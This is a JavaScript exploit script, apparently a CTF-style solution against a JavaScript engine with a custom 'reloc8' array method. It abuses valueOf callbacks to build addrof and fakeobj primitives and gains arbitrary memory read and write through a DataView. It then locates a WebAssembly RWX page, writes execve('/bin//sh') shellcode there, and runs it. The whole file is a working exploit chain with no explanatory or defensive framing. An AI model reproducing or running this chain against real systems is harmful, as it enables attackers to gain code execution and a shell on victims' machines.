const buf = new ArrayBuffer(8);
const f64_buf = new Float64Array(buf);
const u64_buf = new Uint32Array(buf);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

const arrays = [];
for (let i = 0; i < 1000000; i++) {
    arrays.push([1.1, 2.2, 3.3]);
}

const addrof_objArr = [{ a: 1 }];
const addrof_floatArr = [1.1];

const fakeobj_floatArr = [2.2];
const fakeobj_objArr = [{ b: 2 }];

const floatArrMap_oobArr = [3.3];
const floatArrMap_targetArr = [4.4];

function addrof(obj) {
    addrof_objArr[0] = obj;

    const evil = {
        count: 0,
        valueOf: function () {
            this.count++;
            if (this.count == 1) {
                return 0;
            }
            return 15;
        }
    };
    addrof_objArr.reloc8(0, evil);
    return ftoi(addrof_floatArr[0]) & 0xffffffffn;
}

function fakeobj(addr) {
    fakeobj_floatArr[0] = itof(addr << 32n);

    const evil = {
        count: 0,
        valueOf: function () {
            this.count++;
            if (this.count == 1) {
                return 0;
            }
            return 9;
        }
    };
    fakeobj_floatArr.reloc8(0, evil);
    return fakeobj_objArr[0];
}

function getFloatArrMap() {
    const evilFrom = {
        count: 0,
        valueOf: function () {
            this.count++;
            if (this.count == 1) {
                return 0;
            }
            return 3;
        }
    };
    const evilTo = {
        count: 0,
        valueOf: function () {
            this.count++;
            if (this.count == 1) {
                return 0;
            }
            return 6;
        }
    };
    floatArrMap_oobArr.reloc8(evilFrom, evilTo);
    return ftoi(floatArrMap_targetArr[0]);
}

const target = { a: 1337 };
//%DebugPrint(target);
const addr = addrof(target);
console.log("Test addr", addr.toString(16));
const obj = fakeobj(addr);
console.log("Test fakeobj", obj.a);

const floatArrMap = getFloatArrMap();
console.log("Float arr map", floatArrMap.toString(16));

function partialArbRead(addr) {
    addr -= 8n;
    if (addr % 2n === 0) {
        addr += 1n;
    }

    const arr = [itof(floatArrMap), 1.1, 1.2, 1.3];
    arr[1] = itof((8n << 32n) | BigInt(addr));
    const fake = fakeobj(addrof(arr) - 0x20n);
    return ftoi(fake[0]);
}

function partialArbWrite(addr, val) {
    addr -= 8n;
    if (addr % 2n === 0) {
        addr += 1n;
    }

    const arr = [itof(floatArrMap), 1.1, 1.2, 1.3];
    arr[1] = itof((8n << 32n) | BigInt(addr));
    const fake = fakeobj(addrof(arr) - 0x20n);
    fake[0] = itof(val);
}

console.log(partialArbRead(addr).toString(16));
partialArbWrite(addr, 0x41414141n);
console.log(partialArbRead(addr).toString(16));


const arrBuffer = new ArrayBuffer(1024);
const dataView = new DataView(arrBuffer);
const buffer = partialArbRead(addrof(dataView) + 0x10n);
console.log("Array buffer", buffer.toString(16));
const backingStore = partialArbRead(buffer + 0x24n);
console.log("Backing store", backingStore.toString(16));

function arbRead(addr) {
    partialArbWrite(buffer + 0x24n, addr);
    return ftoi(dataView.getFloat64(0, true));
}

function arbWrite(addr, val) {
    partialArbWrite(buffer + 0x24n, addr);
    dataView.setFloat64(0, itof(val), true);
}

function arbWriteArr(addr, arr) {
    partialArbWrite(buffer + 0x24n, addr);
    for (let i = 0; i < arr.length; i += 1) {
        dataView.setUint8(i, arr[i], true);
    }
}

const wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
const wasm_mod = new WebAssembly.Module(wasm_code);
const wasm_instance = new WebAssembly.Instance(wasm_mod);
const f = wasm_instance.exports.main;
const trustedData = partialArbRead(addrof(wasm_instance) + 8n) >> 32n;
console.log("Trusted data", trustedData.toString(16));
const rwxPage = partialArbRead(trustedData + 0x28n);
console.log("Rwx page", rwxPage.toString(16));
arbWrite(rwxPage, 0xccccccccccccccccn);

const shellcode = new Uint8Array([
    0x90, 0x90, 0x90, 0x90,

    0x48, 0x31, 0xd2,                               // xor rdx, rdx        ; envp = NULL
    0x48, 0x31, 0xf6,                               // xor rsi, rsi        ; argv = NULL
    0x52,                                           // push rdx            ; null terminator for string
    0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, // mov rax, 0x68732f2f6e69622f ("/bin//sh")
    0x50,                                           // push rax            ; push string to stack
    0x48, 0x89, 0xe7,                               // mov rdi, rsp        ; rdi points to "/bin//sh"
    0x48, 0x31, 0xc0,                               // xor rax, rax        ; clear rax
    0xb0, 0x3b,                                     // mov al, 0x3b        ; syscall 59 (execve)
    0x0f, 0x05                                      // syscall
]);
arbWriteArr(rwxPage, shellcode);

f();
